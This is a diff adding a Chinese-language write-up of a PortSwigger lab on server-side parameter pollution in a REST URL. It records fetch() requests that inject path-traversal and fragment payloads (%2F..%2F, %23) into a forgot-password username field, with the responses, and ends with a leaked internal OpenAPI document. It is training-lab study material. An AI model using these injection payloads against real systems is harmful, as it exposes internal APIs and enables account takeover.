@@ -204,6 +204,199 @@ forgotPwdReady(() => {
 
 <!-- todo-yus 原理 -->
 
+## Lab: Exploiting server-side parameter pollution in a REST URL
+
+| Dimension | Description                                                                                                                                 |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/api-testing/server-side-parameter-pollution#testing-for-server-side-parameter-pollution-in-rest-paths  |
+| Lab       | https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url |
+
+工具包：
+
+假設 client 發起 `GET /edit_profile.php?name=peter`，server 背後會去戳 `GET /api/private/users/peter`
+
+那 client 可以構造 `GET /edit_profile.php?name=peter%2f..%2fadmin`，server 就會變成去戳 `GET /api/private/users/peter/../admin` => `GET /api/private/users/admin`
+
+嘗試
+
+```js
+fetch(
+  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    referrer:
+      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=administrator%26a=1",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{
+  "type": "error",
+  "result": "The provided username \"administrator&a=1\" does not exist"
+}
+```
+
+嘗試
+
+```js
+fetch(
+  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    referrer:
+      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=administrator%23a=1",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{
+  "type": "error",
+  "result": "Invalid route. Please refer to the API definition"
+}
+```
+
+嘗試
+
+```js
+fetch(
+  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    referrer:
+      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2F",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{
+  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
+}
+```
+
+看起來 `/../../../../` 就是根目錄了(?)
+
+嘗試
+
+```js
+fetch(
+  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    referrer:
+      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2Fapi",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{
+  "type": "error",
+  "result": "Invalid route. Please refer to the API definition"
+}
+```
+
+看來第一層應該是 `api` (?)，因為嘗試 `bpi` 會得到跟上上方一樣的答案
+
+```json
+{
+  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
+}
+```
+
+後來我嘗試用 [Discovering API documentation](https://portswigger.net/web-security/api-testing#discovering-api-documentation) 給的 API Document Endpoints
+
+- /api
+- /swagger/index.html
+- /openapi.json
+- /api/swagger/v1
+- /api/swagger
+- /api
+
+結果都失敗，我這邊有看一下答案，才發現我少了最重要的 (%23) #，這就跟 SQL Injection 的 `-- comment` 是一樣的概念，用來截斷後面的 URL 或是 SQL String
+
+所以後來嘗試
+
+```js
+fetch(
+  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    referrer:
+      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
+    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2Fopenapi.json%23",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "User API",
+    "version": "2.0.0"
+  },
+  "paths": {
+    "/api/internal/v1/users/{username}/field/{field}": {
+      "get": {
+        "tags": [
+          "users"
+        ],
+        "summary": "Find user by username",
+        "description": "API Version 1",
+        "parameters": [
+          {
+            "name": "username",
+            "in": "path",
+            "description": "Username",
+            "required": true,
+            "schema": {
+        ...
+```
+
+雖然 API Document 有被截斷，但結果真的跟我 exploit 的一樣，第一層是 api
+
 ## 參考資料
 
 - https://portswigger.net/web-security/api-testing
